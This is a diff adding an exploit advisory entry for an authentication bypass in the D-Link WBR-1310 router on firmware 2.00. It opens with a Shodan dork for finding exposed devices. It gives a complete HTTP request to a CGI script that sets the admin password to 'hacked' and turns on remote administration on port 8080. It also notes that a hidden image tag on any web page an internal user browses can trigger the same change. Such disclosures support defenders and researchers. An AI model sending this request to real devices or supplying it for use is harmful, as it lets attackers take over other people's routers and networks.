@@ -1,0 +1,19 @@
+# Exploit Title: D-Link WBR-1310 Authentication Bypass Vulnerability
+# Shodan Dork: Embedded HTTP Server 2.00
+# Date: 22-Dec-2010
+# Author: Craig Heffner, /dev/ttyS0
+# Software Link: http://www.dlink.com/products/?pid=474
+# Version: 2.00
+# Tested on: WBR-1301, firmware version 2.00
+
+The CGI scripts in the D-Link WBR-1310 (firmware v.2.00) do not validate authentication credentials. Administrative settings can be changed by sending the appropriate HTTP request directly to a CGI script without authenticating to the device.
+
+The following request will change the administrative password to 'hacked' and enable remote administration on port 8080:
+
+http://192.168.0.1/tools_admin.cgi?admname=admin&admPass1=hacked&admPass2=hacked&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1
+
+Even if remote administration is not enabled, any Web page that any internal user browses to can change the administrator password and enable remote administration via a hidden image tag embedded in the Web page. No Javascript required.
+
+Newer versions of the WBR-1310 firmware are not vulnerable, but since version 2.00 is the default firmware, most WBR-1310 routers are still running it.
+
+More information can be found at: http://www.devttys0.com/wp-content/uploads/2010/12/wbr310_auth_bypass.pdf
